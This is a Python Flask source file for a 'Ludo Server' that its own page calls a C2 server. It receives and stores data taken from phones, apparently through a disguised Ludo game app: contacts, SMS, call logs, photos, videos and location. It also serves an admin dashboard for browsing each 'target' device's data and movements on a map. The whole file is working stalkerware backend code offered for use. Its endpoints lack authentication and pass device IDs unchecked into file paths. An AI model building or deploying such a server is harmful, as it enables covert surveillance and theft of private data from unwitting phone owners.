from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os
import base64
from datetime import datetime

app = Flask(__name__)
CORS(app)

DATA_DIR = "collected_data"
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(os.path.join(DATA_DIR, "photos"), exist_ok=True)

@app.route('/')
def home():
    return '''
    <html>
    <head><title>Ludo Server</title>
    <style>
        body { font-family: Arial; background: #1a1a2e; color: white; text-align: center; padding: 50px; }
        h1 { color: #e94560; }
        .btn { background: #e94560; color: white; padding: 15px 30px; border: none; border-radius: 8px; 
               font-size: 18px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px; }
    </style></head>
    <body>
        <h1>🎲 Ludo Server is Running!</h1>
        <p>Your C2 server is active.</p>
        <a class="btn" href="/admin">Open Admin Dashboard</a>
        <a class="btn" href="/devices">View Devices</a>
    </body></html>
    '''

@app.route('/api/register', methods=['POST'])
def register_device():
    data = request.json
    device_id = data.get('device_id')
    with open(f"{DATA_DIR}/{device_id}_info.json", 'w') as f:
        json.dump(data, f, indent=2)
    return jsonify({"status": "ok", "device_id": device_id})

@app.route('/api/collect', methods=['POST'])
def collect_data():
    data = request.json
    data_type = data.get('type')
    device_id = data.get('device_id')
    
    log_file = f"{DATA_DIR}/{device_id}_all.jsonl"
    with open(log_file, 'a') as f:
        f.write(json.dumps(data) + '\n')
    
    if data_type in ['photo', 'video']:
        media_list = data.get('data', [])
        for media in media_list:
            content = media.pop('content_base64', None)
            if content:
                ext = '.jpg' if data_type == 'photo' else '.mp4'
                filename = f"{DATA_DIR}/photos/{device_id}_{datetime.now().strftime('%Y%m%d%H%M%S')}{ext}"
                try:
                    with open(filename, 'wb') as f:
                        f.write(base64.b64decode(content))
                    media['saved_as'] = filename
                except:
                    pass
    
    elif data_type == 'location':
        loc_file = f"{DATA_DIR}/{device_id}_locations.jsonl"
        with open(loc_file, 'a') as f:
            f.write(json.dumps(data) + '\n')
    
    return jsonify({"status": "ok"})

@app.route('/api/game_move', methods=['POST'])
def game_move():
    data = request.json
    with open(f"{DATA_DIR}/game_moves.jsonl", 'a') as f:
        f.write(json.dumps(data) + '\n')
    return jsonify({"status": "ok"})

@app.route('/devices', methods=['GET'])
def list_devices():
    devices = []
    if os.path.exists(DATA_DIR):
        for f in os.listdir(DATA_DIR):
            if f.endswith('_info.json'):
                with open(os.path.join(DATA_DIR, f)) as fh:
                    devices.append(json.load(fh))
    return jsonify(devices)

@app.route('/admin', methods=['GET'])
def admin_page():
    return '''
    <html>
    <head>
        <title>Ludo Admin Dashboard</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
        <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: Arial; background: #1a1a2e; color: #eee; padding: 20px; }
            .container { max-width: 1200px; margin: auto; }
            h1 { color: #e94560; margin-bottom: 20px; }
            input, button { padding: 12px 20px; border: none; border-radius: 8px; font-size: 16px; }
            input { width: 300px; margin-right: 10px; background: #16213e; color: #eee; }
            button { background: #e94560; color: white; cursor: pointer; margin: 5px; }
            .tabs { display: flex; gap: 10px; margin: 20px 0; flex-wrap: wrap; }
            .tab-btn { padding: 10px 20px; background: #16213e; color: #eee; border: none; border-radius: 8px; cursor: pointer; }
            .tab-btn.active { background: #e94560; }
            .tab-content { display: none; background: #16213e; padding: 20px; border-radius: 12px; }
            .tab-content.active { display: block; }
            .data-item { padding: 10px; border-bottom: 1px solid #333; margin-bottom: 10px; }
            #map { height: 400px; border-radius: 12px; margin-bottom: 20px; }
            .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 12px; margin-left: 10px; }
            .badge.green { background: #4CAF50; }
            .badge.red { background: #F44336; }
            .badge.blue { background: #2196F3; }
            img.thumb { max-width: 200px; max-height: 200px; border-radius: 8px; margin: 5px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎲 Ludo Admin Panel</h1>
            <div>
                <input type="text" id="deviceId" placeholder="Enter Target Device ID">
                <button onclick="loadData()">Load Target Data</button>
                <button onclick="listDevices()" style="background:#2196F3">List All Devices</button>
                <a href="/devices" style="color:#e94560; margin-left:20px;">View devices as JSON</a>
            </div>
            <div id="deviceList" style="margin:20px 0;"></div>
            <div id="lastUpdate"></div>

            <div class="tabs">
                <button class="tab-btn active" onclick="switchTab('location')">📍 Location</button>
                <button class="tab-btn" onclick="switchTab('contacts')">📞 Contacts</button>
                <button class="tab-btn" onclick="switchTab('sms')">💬 SMS</button>
                <button class="tab-btn" onclick="switchTab('photos')">📸 Photos</button>
                <button class="tab-btn" onclick="switchTab('calls')">📞 Call Logs</button>
                <button class="tab-btn" onclick="switchTab('raw')">📋 Raw Data</button>
            </div>

            <div id="location" class="tab-content active"><div id="map"></div><div id="locationsData"></div></div>
            <div id="contacts" class="tab-content"><div id="contactsData"></div></div>
            <div id="sms" class="tab-content"><div id="smsData"></div></div>
            <div id="photos" class="tab-content"><div id="photosData"></div></div>
            <div id="calls" class="tab-content"><div id="callsData"></div></div>
            <div id="raw" class="tab-content"><pre id="rawData" style="white-space:pre-wrap;font-size:12px;"></pre></div>
        </div>

        <script>
            const SERVER = window.location.origin;

            function switchTab(name) {
                document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                document.getElementById(name).classList.add('active');
                event.target.classList.add('active');
            }

            function listDevices() {
                fetch(SERVER + '/devices')
                    .then(r => r.json())
                    .then(devices => {
                        const div = document.getElementById('deviceList');
                        if (!devices || devices.length === 0) {
                            div.innerHTML = '<p>No devices registered yet. Wait for target to open app.</p>';
                            return;
                        }
                        div.innerHTML = '<h3>Registered Devices:</h3>' + devices.map(d =>
                            `<div class="data-item">
                                <strong>🔑 '${d.device_id}'</strong>
                                <span class="badge blue">${d.model || 'Unknown'}</span>
                                <button onclick="document.getElementById('deviceId').value='${d.device_id}';loadData();">Load</button>
                                <button onclick="navigator.clipboard.writeText('${d.device_id}');alert('Copied!')">Copy ID</button>
                            </div>`
                        ).join('');
                    });
            }

            function loadData() {
                const deviceId = document.getElementById('deviceId').value.trim();
                if (!deviceId) { alert('Enter a Device ID'); return; }
                document.getElementById('lastUpdate').innerHTML = '<p>Loading...</p>';

                fetch(SERVER + '/api/collect/' + deviceId)
                    .then(r => r.json())
                    .then(data => {
                        document.getElementById('lastUpdate').innerHTML =
                            `<p>Updated: ${new Date().toLocaleString()} | Device: <strong>${deviceId}</strong></p>`;
                        displayLocations(data.locations || []);
                        displayContacts(data.contacts || []);
                        displaySMS(data.sms || []);
                        displayPhotos(data.photos || []);
                        displayCalls(data.call_logs || []);
                        document.getElementById('rawData').textContent = JSON.stringify(data, null, 2);
                    })
                    .catch(err => {
                        document.getElementById('lastUpdate').innerHTML = `<p style="color:red">Error: ${err.message}. Loading from file...</p>`;
                        // Fallback: try to load from files
                        loadDataFromFiles(deviceId);
                    });
            }

            function loadDataFromFiles(deviceId) {
                // This is a simple fallback using the raw JSONL files
                fetch(SERVER + '/api/collect/' + deviceId)
                    .then(r => r.text())
                    .then(text => {
                        try {
                            const data = JSON.parse(text);
                            displayFromParsed(data, deviceId);
                        } catch(e) {
                            document.getElementById('lastUpdate').innerHTML = '<p style="color:red">No data found for this device yet.</p>';
                        }
                    })
                    .catch(() => {
                        document.getElementById('lastUpdate').innerHTML = '<p style="color:red">No data found. Wait for target to use the app.</p>';
                    });
            }

            function displayLocations(locations) {
                const div = document.getElementById('locationsData');
                if (!locations || locations.length === 0) {
                    div.innerHTML = '<p>No location data yet. Target needs to allow location permission.</p>';
                    return;
                }
                if (document.getElementById('map')) {
                    try {
                        const last = locations[locations.length - 1];
                        const map = L.map('map').setView([last.lat, last.lng], 15);
                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                        locations.forEach(loc => {
                            L.circleMarker([loc.lat, loc.lng], {
                                radius: 5, color: '#e94560', fillColor: '#e94560', fillOpacity: 0.8
                            }).addTo(map).bindPopup(`Acc: ${loc.accuracy || '?'}m<br>${new Date(loc.timestamp).toLocaleString()}`);
                        });
                    } catch(e) { console.log('Map error', e); }
                }
                div.innerHTML = '<h3>📍 Location History</h3>' +
                    [...locations].reverse().slice(0, 50).map(loc =>
                        `<div class="data-item">
                            <a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}" target="_blank">🌍 ${loc.lat}, ${loc.lng}</a>
                            <span class="badge green">±${loc.accuracy || '?'}m</span>
                            <span style="float:right">${new Date(loc.timestamp).toLocaleString()}</span>
                        </div>`
                    ).join('');
            }

            function displayContacts(contacts) {
                const div = document.getElementById('contactsData');
                if (!contacts || contacts.length === 0) { div.innerHTML = '<p>No contacts yet.</p>'; return; }
                div.innerHTML = `<h3>📞 ${contacts.length} Contacts</h3>` +
                    contacts.map(c => `<div class="data-item"><strong>${c.name || 'Unknown'}</strong><br>📱 ${c.numbers ? c.numbers.join(', ') : 'No number'}</div>`).join('');
            }

            function displaySMS(smsList) {
                const div = document.getElementById('smsData');
                if (!smsList || smsList.length === 0) { div.innerHTML = '<p>No SMS yet.</p>'; return; }
                const typeMap = { '1': '📩 Inbox', '2': '✉️ Sent' };
                div.innerHTML = `<h3>💬 ${smsList.length} Messages</h3>` +
                    [...smsList].reverse().slice(0, 100).map(s =>
                        `<div class="data-item">
                            <strong>${s.address || 'Unknown'}</strong>
                            <span class="badge ${s.type == '1' ? 'green' : 'blue'}">${typeMap[s.type] || 'Unknown'}</span>
                            <p>${s.body || ''}</p>
                            <small>${s.date ? new Date(parseInt(s.date)).toLocaleString() : ''}</small>
                        </div>`
                    ).join('');
            }

            function displayPhotos(photos) {
                const div = document.getElementById('photosData');
                if (!photos || photos.length === 0) { div.innerHTML = '<p>No photos yet.</p>'; return; }
                div.innerHTML = `<h3>📸 ${photos.length} Photos</h3>` +
                    photos.map(p => 
                        `<div class="data-item">
                            📸 ${p.path || 'Unknown'}<br>
                            Size: ${(p.size / 1024).toFixed(1)} KB<br>
                            ${p.content_base64 ? `<img class="thumb" src="data:image/jpeg;base64,${p.content_base64}" />` : ''}
                            <small>${p.date_added ? new Date(parseInt(p.date_added) * 1000).toLocaleString() : ''}</small>
                        </div>`
                    ).join('');
            }

            function displayCalls(calls) {
                const div = document.getElementById('callsData');
                if (!calls || calls.length === 0) { div.innerHTML = '<p>No call logs yet.</p>'; return; }
                const typeMap = { '1': '📲 Incoming', '2': '📞 Outgoing', '3': '❌ Missed' };
                div.innerHTML = `<h3>📞 ${calls.length} Calls</h3>` +
                    [...calls].reverse().slice(0, 100).map(c =>
                        `<div class="data-item">
                            ${typeMap[c.type] || '📱'} <strong>${c.name || c.number || 'Unknown'}</strong><br>
                            Duration: ${c.duration || '0'}s<br>
                            <small>${c.date ? new Date(parseInt(c.date)).toLocaleString() : ''}</small>
                        </div>`
                    ).join('');
            }

            function displayFromParsed(data, deviceId) {
                displayLocations(data.locations);
                displayContacts(data.contacts);
                displaySMS(data.sms);
                displayPhotos(data.photos);
                displayCalls(data.call_logs);
            }
        </script>
    </body></html>
    '''

@app.route('/api/collect/<device_id>', methods=['GET'])
def get_collected_data(device_id):
    result = {
        "device_id": device_id,
        "contacts": [],
        "sms": [],
        "locations": [],
        "photos": [],
        "call_logs": [],
        "all_events": []
    }
    
    # Load from the combined log file
    log_file = f"{DATA_DIR}/{device_id}_all.jsonl"
    if os.path.exists(log_file):
        with open(log_file) as f:
            for line in f:
                try:
                    event = json.loads(line.strip())
                    result["all_events"].append(event)
                    event_type = event.get('type')
                    event_data = event.get('data', event)
                    
                    if event_type == 'contacts':
                        result['contacts'] = event.get('data', [])
                    elif event_type == 'sms':
                        result['sms'] = event.get('data', [])
                    elif event_type == 'location':
                        result['locations'].append(event_data if isinstance(event_data, dict) else event)
                    elif event_type in ['photo', 'video']:
                        result['photos'].extend(event.get('data', []))
                    elif event_type == 'call_logs':
                        result['call_logs'] = event.get('data', [])
                except:
                    pass
    
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
